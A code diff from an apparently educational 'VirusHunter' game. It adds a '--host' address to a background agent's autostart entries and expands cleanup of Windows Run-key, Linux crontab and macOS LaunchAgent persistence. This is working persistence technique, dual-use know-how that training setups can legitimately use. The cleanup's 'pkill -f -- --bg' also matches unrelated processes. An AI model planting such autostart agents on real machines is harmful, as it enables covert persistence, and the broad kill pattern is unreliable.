@@ -2,10 +2,11 @@ import os
 import sys
 import subprocess
 from pathlib import Path
-from typing import Tuple
+from typing import List, Tuple
 
 SIMULATED_STARTUP_DIR = Path(__file__).resolve().parent / "simulated_startup"
 PERSISTENCE_MARKER = SIMULATED_STARTUP_DIR / "system_defender_autorun.txt"
+LAUNCH_AGENT_LABEL = "com.v-hunter.agent"
 
 def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
     """Create a persistent background process using platform-specific methods."""
@@ -43,8 +44,7 @@ def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
     # 3. macOS: LaunchAgent (plist)
     elif sys.platform == "darwin":
         try:
-            label = "com.v-hunter.agent"
-            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{label}.plist"
+            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{LAUNCH_AGENT_LABEL}.plist"
             plist_path.parent.mkdir(parents=True, exist_ok=True)
             
             # Simple plist content
@@ -53,12 +53,14 @@ def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>{label}</string>
+    <string>{LAUNCH_AGENT_LABEL}</string>
     <key>ProgramArguments</key>
     <array>
         <string>{sys.executable if is_frozen else sys.executable}</string>
         {"<string>" + (Path(__file__).resolve().parent.parent / "game" / "main_game.py").as_posix() + "</string>" if not is_frozen else ""}
         <string>--bg</string>
+        <string>--host</string>
+        <string>{host}</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -79,6 +81,7 @@ def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
     try:
         cmd_args = [sys.executable] if is_frozen else [sys.executable, "-m", "game.main_game"]
         cmd_args.append("--bg")
+        cmd_args.extend(["--host", host])
         
         if sys.platform == "win32":
             subprocess.Popen(cmd_args, creationflags=0x00000008 | 0x00000200, close_fds=True)
@@ -89,37 +92,124 @@ def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
         print(f"Immediate Launch Error: {e}")
         return False, PERSISTENCE_MARKER
 
+def _safe_run(cmd: List[str]) -> bool:
+    try:
+        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception:
+        return False
+
+def _safe_run_shell(cmd: str) -> bool:
+    try:
+        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception:
+        return False
+
 def remove_persistence() -> Tuple[bool, Path]:
-    """Remove all persistence markers and entries."""
+    """Remove persistence markers and startup entries created by this project."""
+    removed_any = False
+
     # 1. Windows Cleanup
     if sys.platform == "win32":
         try:
             import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.DeleteValue(key, "VirusHunterAgent")
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE,
+            )
+            try:
+                winreg.DeleteValue(key, "VirusHunterAgent")
+                removed_any = True
+            except FileNotFoundError:
+                pass
             winreg.CloseKey(key)
-        except: pass
-        subprocess.run(["taskkill", "/F", "/IM", "VirusHunter.exe"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        subprocess.run(["taskkill", "/F", "/IM", "pythonw.exe"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+        # Stop packaged executable if present (more targeted than killing all pythonw.exe)
+        if _safe_run(["taskkill", "/F", "/IM", "VirusHunter.exe"]):
+            removed_any = True
+
+        # Stop background agent processes by commandline signature (avoid killing unrelated Python)
+        # Matches: --bg plus either game.main_game, main_game.py, or VirusHunterAgent.
+        ps = r"""
+$ErrorActionPreference = 'SilentlyContinue'
+$procs = Get-CimInstance Win32_Process | Where-Object {
+  $_.CommandLine -and
+  ($_.CommandLine -match '--bg') -and
+  ($_.CommandLine -match 'game\.main_game|main_game\.py|VirusHunterAgent|VirusHunter')
+}
+foreach ($p in $procs) { try { Stop-Process -Id $p.ProcessId -Force } catch {} }
+"""
+        try:
+            subprocess.run(
+                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            removed_any = True
+        except Exception:
+            pass
 
     # 2. Linux Cleanup
     elif sys.platform.startswith("linux"):
         try:
-            subprocess.run("crontab -l | grep -v 'game/main_game.py' | crontab -", shell=True)
-            subprocess.run(["pkill", "-f", "main_game.py"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        except: pass
+            # Remove only lines matching our agent invocation patterns
+            subprocess.run(
+                "crontab -l 2>/dev/null | grep -v -E '(game/main_game\\.py|VirusHunterAgent|v-hunter|--bg)' | crontab -",
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            removed_any = True
+        except Exception:
+            pass
+
+        # Stop the background agent if running (support both invocation styles)
+        if _safe_run(["pkill", "-f", "--", "--bg"]):
+            removed_any = True
 
     # 3. macOS Cleanup
     elif sys.platform == "darwin":
         try:
-            label = "com.v-hunter.agent"
-            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{label}.plist"
-            subprocess.run(["launchctl", "unload", str(plist_path)], capture_output=True)
-            if plist_path.exists(): plist_path.unlink()
-            subprocess.run(["pkill", "-f", "main_game.py"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        except: pass
+            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{LAUNCH_AGENT_LABEL}.plist"
+
+            # Try to unload/bootout in a few compatible ways
+            _safe_run(["launchctl", "unload", str(plist_path)])
+            _safe_run(["launchctl", "bootout", "gui/%d" % os.getuid(), str(plist_path)])
+            _safe_run(["launchctl", "remove", LAUNCH_AGENT_LABEL])
+            # Also attempt bootout by label (works on some macOS versions)
+            _safe_run(["launchctl", "bootout", f"gui/{os.getuid()}/{LAUNCH_AGENT_LABEL}"])
+
+            if plist_path.exists():
+                plist_path.unlink()
+                removed_any = True
+
+            # Stop background agent mode (support both invocation styles)
+            # Keep it reasonably targeted: must include --bg and our game module/script.
+            _safe_run_shell(r"pkill -f -- 'game\.main_game.*--bg' >/dev/null 2>&1 || true")
+            _safe_run_shell(r"pkill -f -- 'game/main_game\.py.*--bg' >/dev/null 2>&1 || true")
+            if _safe_run(["pkill", "-f", "--", "--bg"]):
+                removed_any = True
+        except Exception:
+            pass
 
     if PERSISTENCE_MARKER.exists():
         PERSISTENCE_MARKER.unlink()
-    return True, PERSISTENCE_MARKER
+        removed_any = True
+
+    # Clean up simulated dir if empty
+    try:
+        if SIMULATED_STARTUP_DIR.exists() and SIMULATED_STARTUP_DIR.is_dir():
+            remaining = [p for p in SIMULATED_STARTUP_DIR.iterdir()]
+            if not remaining:
+                SIMULATED_STARTUP_DIR.rmdir()
+                removed_any = True
+    except Exception:
+        pass
+
+    return removed_any, PERSISTENCE_MARKER
 
